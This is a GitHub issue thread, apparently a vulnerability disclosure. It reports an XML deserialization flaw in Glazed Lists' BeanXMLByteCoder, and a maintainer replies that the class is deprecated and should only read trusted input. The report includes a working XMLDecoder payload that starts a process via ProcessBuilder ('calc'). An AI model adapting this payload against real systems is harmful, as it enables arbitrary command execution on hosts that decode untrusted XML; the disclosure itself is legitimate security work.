| vulnerability location: `ca.odell.glazedlists.impl.io.BeanXMLByteCoder`  `BeanXMLByteCoder` class provides `decode()` method to decode the Object from a InputStream.  When the `decode()` method is called, the program will call `XMLDecoder.readObject()` to parse the XML string without any check, which causing a XML Deserialization vulnerability.  *ca.odell.glazedlists.impl.io.BeanXMLByteCoder#decode*  [image](https://user-images.githubusercontent.com/32481749/234550131-cc4fc0eb-6ca9-4d0c-9b7a-e8e0f1b78e65.png)  attack payload:  ``` <java> 	<object class="java.lang.ProcessBuilder"> 		<array class="java.lang.String" length="1"> 			<void index="0"><string>calc</string></void> 		</array> 		<void method="start"></void> 	</object> </java> ```  use a little program to test.  os: windows 10 jdk: 1.8.0\_111 glazedlists: 1.11.0  [image](https://user-images.githubusercontent.com/32481749/234553236-7f093147-efca-4919-9668-705cb5d34567.png) |

| Thanks for reporting the issue to us. BeanXMLByterCoder is a small adapter for the XMLDecoder and XMLEncoder classes from the standard Java API. As you point out, the security issue is located in the XMLDecoder.readObject method when reading from an untrusted input source. As far as I can see, BeanXMLByterCoder is part of the GlazedList IO extension, but is not used actively in the code base. A GlazedLists user using BeanXMLByterCoder should only deserialize from trusted input sources.  Please note, that the Glazed Lists IO extension is deprecated and will be removed from the next major version of Glazed Lists. But even if BeanXMLByterCoder is removed, the vulnerability is still there in XMLDecoder. That's nothing we can do about. |
